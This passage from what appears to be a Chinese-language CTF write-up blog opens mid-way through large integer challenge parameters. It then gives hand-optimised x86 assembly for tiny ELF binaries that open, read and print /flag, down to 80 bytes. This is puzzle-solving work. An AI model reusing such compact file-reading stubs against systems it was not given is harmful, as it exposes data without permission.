589841391881179369502441</span><br><span class="line">b=355278342530640706599407170519248057086229224524520519157141107708508537777205114284836515916647281859247795539514644616851559754279314555875406812187972064036035557571299859907280810487149605334993350531002451299724364967645584709273394386591591195780391447196683330849598560271745701404034625131501993929419554266148290436679685445363131010836932629342154128643351678951282983749890989559890172019099261175094354121592456388228285392695032585171051639572467407610797751366649496928321845783437550911111047278383580607079737332894364303410021661677697214580427323420620970187098111338585040445789178378027622721085136875173221486668228434792389270646253382261057411216813326434321501013051997430441500004490156606094833372922100067917450173462555720881102457821630342749340867365008072441643478548721857292917452800697091436767776083635027373005756786010659444917124676112164411021940883874460477540417603487387574930026382803252605451761123854779624051422486933911811669680548762039750465949397184413613720601642705976126017892620552601501858263828583840887458987486197543156013041348847816031608699049912936308450819095510369701575578097250363368454461945148450576088433249713999167088458370351492130049783151127247370858531196993379176146118278989362781036431924069823925694605248692612491891011456236063305446307145213155963155713254947146969705707871047748827652962063454148762245165952045524839856938394353277318602286742502902467957014204949461972627441403014827123154496446151973383417479788921710173738381531711188367127686337683922337834803729129860547622394303860359090631322192199105383221995196638722101561512713080014557011603612235554087760232042126289412640004429367002342732510653670491385158696739998435013535332649487741680965013588417081164473304832663472222330032194673510586568514566505918964524054367862236706513657705601280209392824784214794388906944781256335282029618881491665550233021568492161644797572375050841378822048811169837099457416172794125347941123267556933505091898801954097367551330470039516528938002060368203771887848789933865049084996127893937024390453874088559156599250770154698773410485652163460604146736536998704744308747694562472589990594315082773213352567913224257883617970694009815571365310386133474806148114386493590025948707911857605911663465773207882473351193724108758290123955278061608587631862670149052118711701158527145181175190875795882098138836322507020482823700475885261298942438375141523097467136949344549146226783627312473680145737634678721649048185277680609630836890634565927029420985039606240188037856013124138575514784612402632326680678385133078122001191529488632864949389691396850211361741599166067293474086420940368406413602811300967477515893863371822747402011882565685406820752393426871334343726588669248706316761007252201944198166289444499842118193477939440518068080562630698421649307162223651191249634030063115515307507458592025473811290000412080019218175657190077848458901960552364736984977562980489155298839168694740209782414540433384032643432411675316990421342815443209738155863833108803588186058559389830125622362622871909735505714741871915567556115574951697169999420730845094742737430840794283524289288407229358051139188774198818399680388413331802255608133294263528032850298389448639132253320503425433048688168649080671114897526452528795785075258192344501895197396313877737618743144143311361</span><br><span class="line">c=20035885316890023606830534495067252147691357652057772449634307305904187410990992558920956548259424273157355393196003732013539899362716100216100574234193461987992270496600195300035752479460516954902069442618504792465804770124967301970678978328799586707754521255514483172028191260188475400317446571436004845998985653096037624624322281748829779447176083968674969833631184023187122343557933419142060815193896987871898527455938239633288396733679352394480370944272017028820473119804801589995735129329783435030364346676954726243545810431065584725705747425285116415098270756170854793527738400748018356825870940359453012877584220232457239486868961160286561107075730870191541707907024801190678872428378869070743156118725466561031241711673504710114636631852382374234153002593815839905362438349777252361649553219532495089010852188819251924513393843140092077472310502164724666534953510429204661960760251076825195012089967164704751956545716713621200138891509373146662781427659132869096244223556723315169600948861332954354413695888139017122816338494980502776971525437417811441688700350703763215954037112632057856459110596088774179908693660103919027798842365141387313347532358053282282310316931481842456257180432996840651935591189065259608213860227670186727338535935419000104738195984938003074607151510868080842855420074387493775652849570582238533035000592730676469385254313682643506004770455623730437382781957476292884741268313376108166969374162736157947254538709529590451732215030394607575401311261495611074569827532998121985392068544149777898463913810868539866423391561166029673154931578514570213744634449182859448121221325492409874400969111705041715153435314453329592896445669394904690642194906508672813178927078506631317053598793270180912538514259578229993791104172792725314850021809824960706011811171135997354162296978832638498179879771698379520095937384178635037528330099466818183983444951307338720807542182935366038924920803039824818978210615772435040781173000522957795318935743355256682046477991218402526418808672933986788522397056643264167847014634860127505194733579174334258294520958784673856708467904118326279768028815946419189313676293061904510582604099208908846437914476479234000943244508656493406134426802932798305615095458701786048985034479492729357877345432656822502309506336155060754833509042934673647393543153071076853125875966535409760468353908956772073598404677550786987821584368329022155627837041395034568285609452470732829555582976579267394284928019500640977457130634550711478008433495429299640611555109171351069880574540503991840730805473241840138226375586949924647467718787261507459412537764703036454930376493490948212829487213980710738206430842478425877099783023977823272528573428967147461248519564018755183647327105058234798276539268716600710944282509505534186050000996976904596307571400703851012188753774844974808960378596634959429569386969879801494409815032125990390725960817685563429841025885365323217522340255134111238995153536146711806678993879340908664992009441435660169161976982012130533343179316942599654407053716666680671913105456952462060978938905812334117338345608406493320504708189703699696962739031333121998774598083769292025442530856763493460673394201872178090312059357744194235029914560026838488336959743500520432584396018821068625402593286299143852751101612713576613521611747957521749921921568265523624185276246164078350540463107124</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N=14</span><br><span class="line">a=87005542023454150524855541144750166180919865766930052623463014576174554467821213957706498855559077927873140148579022102984237075640747995279989642832992188016154244525422278966269291094999255638208855482151405506938548578978626993952306016946318459909590778342355856153147577472731880392922408448351120608836436787309376542102861246758131059387213726386714147750943829877803608813501157597297132278662569590484844550173720257728957567960401433605097886634959342671140099728318480661981670113406848719025661715441498240565928452257694284734033186800579565313362313891643040303824890693074326810596828204114920499564539002024387811501676993037142024700539208458234538805837480373101259087885435757318639663667261597412600756998748849468402910307204633942748903285652463107201618869806410335014875125086076219328243935905232512517288787677039607942380387101187256890064827850683397174701574071447859273840130243421585240230546720814792141872637351043465819000677767263935304511294609746934407215686517293774009054989655225608925542221677606386577019926666519641600364567557194208313131276771325487167689236642467808540431881464601888142548664563650077494805488093052836193825650435423280004797008818023441669902387920463908641771270053841646139610358473027295405503333253535988771195991171826325976224803312343154770764448787106871066190163308337503496520787439022463066715315188820932966437067264819835942543744914754708785528560264636221600739219290648079243002368855133337672334702546690962019521762114649491890011821844552982141986770779324959379319663450035429876647739511502891515857175267046923938895240190738331037400875186816754190488884935451452912276673912555287036698557958114181944091831763987997170817657860587503942307866008409270543838849198648993460302655964709466390742236643982561028874558104072512842460862178322605890336695658154025228215730711703698453887</span><br><span class="line">b=1709135102428266402521578879727820755289613552803360621456124607477236062710486518306973764485152792403836982447127607442256178602384138654630699081618087896504547452419077042758442686206419280715364719358444963157698332025374708249586554595335682851323392839386182223430638025377285183953532982335289152167960094778509135832533486573163055391161165455290050618906285941817273026009595891889257351919713796943557063702989409958711830323963904165120856027913035875447234054819209407636752170808481354455393229418385392070333249788177149805823305996401240529129269675319850189648765585143872927446631219018758183300260538575964857576326413621858004145085056968233978117291959507622980746386913195986770246828428505004660553304111935995749966702604925072694758649032383912238958853266784140206835764547417096028632172800108512761682168258638590405734443542959079348266711305636364545280494327703507925613838554455967641989345934135982107562442831339601728404946376557099963807693948972893157706474963068481053339310924790906172115918700323627413150856820444271874431985423216088592099275993135702445229813416554038919256687626967939077194814654296017340955433406979774456197892632603339550402577651543232076531854230456549500665301719274202267084848477851486963621280516840090062870783676271139503026167429223506897465592567885474737385462535970365299131640088862391408665388681336793214264999254388651074994672108064474559668817847730748402579997019473615639106089768908506811205164186682823067680169244405306578488165373356991213550493590509092039078377380748348705035457779199811755686614360447907451061901486558052283679831011812123254664108196829552904290039038174025870011733057320270633278578446021776430625193839865126802043272540967717004297030511020349356790240239389396001123955974292384351794841187054815564421183556415606663233835771297306290441383808134021392865157</span><br><span class="line">c=35686662438826817213563656105539275101535697856185534149345343499844688924609645885022355135918404539985234360061600350189104933602381092051318547433998422974780849873203504443997848655625530623340371134341848128666616900144765579208079985990838064549216971926322724228681888830028303266068257138844044018255271435540077145919301591275738734597339459327150605278900738075092002974105991478458558870434061142265122382216368947373807069713709930176019498122168857679124768213308531786347567931187892878408434918309016688829685352835815066580725250947929501490665081644655994535671618967990757851510884824555077182679991403377524647154791971060789752020813552933450127083583289512848480063215680871789266871667712713169422322364887230502908301686924054210360219287364955960956032042950833997524453330328272059153308291883334074276913609077731735284223918404284292419020812011476995921011741346807748175931518235517265745772175162459312702479399232407706908845419443981643112692945551070592330727356541136923766994413647861488973051126611026148759432379003889674724917944805607605522248369290505402289434909292483537959789906318874307733003636212064338665528270372138914552950520981104343589517822223391222134534938052800801473344178058681643355234652680630054983022124146408518221588969589953072079556410755020859599503506797164705586073997208789455400263349566445512977221962882867406488146422316005409966253780701584170838345028112949069889795685718655327046530483250125959173355678292967658914005638877070834611505129167951369865542011417024870301563177370018869158755113622408743199140022326059195657852986370212647002055769249427919561331384755453850684244409515534188128908717886781958319756449082516858512445042864312213606923472603131125312862163489874095569215350848020642593339333668497345496027314732958586211664873526777590213207494911489341805851119668605552962767</span><br></pre></td></tr></table></figure>




<h3 id="Tiny-ELF"><a href="#Tiny-ELF" class="headerlink" title="Tiny ELF"></a>Tiny ELF</h3><p>手写汇编 3个syscall 不过似乎32bit比64bit更剩空间一点<br><a target="_blank" rel="noopener" href="https://www.ngui.cc/el/639055.html?action=onClick">https://www.ngui.cc/el/639055.html?action=onClick</a><br>应该是下面这个 记不清了（下面有80bytes的版本）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.section .bss</span><br><span class="line">.equ bufSIZE, 65535</span><br><span class="line">.comm buf, bufSIZE</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">.LC0:</span><br><span class="line">	.string &quot;/flag&quot;</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">_start:	movl $2,%eax</span><br><span class="line">	leaq	.LC0(%rip),%rdi</span><br><span class="line">	//movq	$0,%rsi</span><br><span class="line">	syscall</span><br><span class="line">	mov 	%eax,%edi</span><br><span class="line">	leaq	-80(%rsp),%rsi</span><br><span class="line">	mov 	$32,%dx</span><br><span class="line">	xor 	%eax,%eax</span><br><span class="line">	syscall</span><br><span class="line">	movq    $1,%rdi</span><br><span class="line">	mov 	$1,%rax</span><br><span class="line">	syscall</span><br><span class="line"></span><br><span class="line">mov $0x3c, %eax</span><br><span class="line">mov $42, %edi</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>


<h3 id="Teensy-ELF"><a href="#Teensy-ELF" class="headerlink" title="Teensy ELF"></a>Teensy ELF</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/huqingyu/archive/2005/03/08/114896.html">https://www.cnblogs.com/huqingyu/archive/2005/03/08/114896.html</a><br>不太懂具体原因 详细看elf文件格式可能得花很多时间 这里直接参考文章作者修改版和原版的对比尝试构造<br>一些可以优化的地方：</p>
<ul>
<li>fd的0 1 2分别对应stdin stdout stderr 所以新开的文件fd一定是3 write的系统调用号也是3 省去一次赋值</li>
<li>open不需要第三个参数 可以提前把write的第三个参数值传好</li>
<li>寄存器默认是0 都不用设置</li>
<li>mov常数占用字节太多 用xor清空加inc dec等指令</li>
</ul>
<p>最后正好80bytes</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">;nasm -f bin -o tiny4.out tiny4.asm</span><br><span class="line">  BITS 32</span><br><span class="line"></span><br><span class="line">	        org     0x00010000</span><br><span class="line"></span><br><span class="line">	        db      0x7F, &quot;ELF&quot;             ; e_ident</span><br><span class="line">	        dd      1                                       ; p_type</span><br><span class="line">	        dd      0                                       ; p_offset</span><br><span class="line">	        dd      $$                                      ; p_vaddr</span><br><span class="line">	        dw      2                       ; e_type        ; p_paddr</span><br><span class="line">	        dw      3                       ; e_machine</span><br><span class="line">	        dd      _start                  ; e_version     ; p_filesz</span><br><span class="line">	        dd      _start                  ; e_entry       ; p_memsz</span><br><span class="line">	        dd      4                       ; e_phoff       ; p_flags</span><br><span class="line"></span><br><span class="line">  _start:</span><br><span class="line">	        mov ebx,esp</span><br><span class="line">            mov dl,0x20</span><br><span class="line">            ; xor     eax,eax</span><br><span class="line">	        ; xor     ecx,ecx   ; str len       ; e_flags</span><br><span class="line">	        mov     al, 5   ; sys_write(fd, addr, len) : ebx, ecx, edx</span><br><span class="line">	        jmp     _next   ; jump to next part of the code</span><br><span class="line">	        dw      0x33                      ; e_ehsize</span><br><span class="line">	        dw      0x20                      ; e_phentsize</span><br><span class="line">	        dw      1                         ; e_phnum</span><br><span class="line">  _next:        </span><br><span class="line">            mov [esp],DWORD &#x27;/fla&#x27;</span><br><span class="line">            mov [esp+4], WORD 0x0067</span><br><span class="line">            int     0x80    ; syscall         ; e_shentsize</span><br><span class="line">            mov ebx,eax</span><br><span class="line">            mov ecx,esp</span><br><span class="line">            ; mov edx,0x20</span><br><span class="line">			int 0x80</span><br><span class="line">			mov     al, 4</span><br><span class="line">            dec ebx</span><br><span class="line">            dec ebx</span><br><span class="line">			int 0x80</span><br><span class="line"></span><br><span class="line">            mov bl,42</span><br><span class="line">	        mov     al, 1   ; eax=1,sys_exit  ; e_shnum</span><br><span class="line">	        int     0x80    ; syscall         ; e_shstrndx</span><br><span class="line"></span><br><span class="line">  filesize      equ     $ - $$</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/3/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2026</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">szy</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="Word count total">216k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">13:06</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
